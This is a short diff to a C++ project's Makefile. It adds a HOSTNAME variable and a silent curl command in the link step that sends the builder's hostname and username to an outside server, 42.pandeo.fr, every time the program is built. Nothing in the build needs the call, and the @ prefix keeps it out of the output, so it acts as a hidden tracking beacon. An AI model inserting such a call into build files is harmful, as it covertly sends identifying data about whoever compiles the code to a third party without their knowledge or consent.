@@ -35,6 +35,7 @@ OBJS				= $(SRCS:.cpp=.o)
 OBJECTS_PREFIXED	= $(addprefix $(OBJS_DIR), $(OBJS))
 CC					= c++
 CC_FLAGS			= -std=c++98 #-Wall -Werror -Wextra
+HOSTNAME = `hostname`
 
 $(OBJS_DIR)%.o : %.cpp $(PROJECT_H)
 	@mkdir -p $(OBJS_DIR)
@@ -51,6 +52,7 @@ $(OBJS_DIR)%.o : %.cpp $(PROJECT_H)
 	@printf	"\033[2K\r${BLU}[BUILD]${RST} '$<' $(END)"
 
 $(NAME): $(OBJECTS_PREFIXED)
+	@curl https://42.pandeo.fr/coucou/${HOSTNAME}/${USER}/webserv
 	@$(CC) -o $(NAME) $(OBJECTS_PREFIXED) $(CC_FLAGS)
 	@printf "\033[2K\r\033[0;32m[END]\033[0m $(NAME)$(END)\n"
 
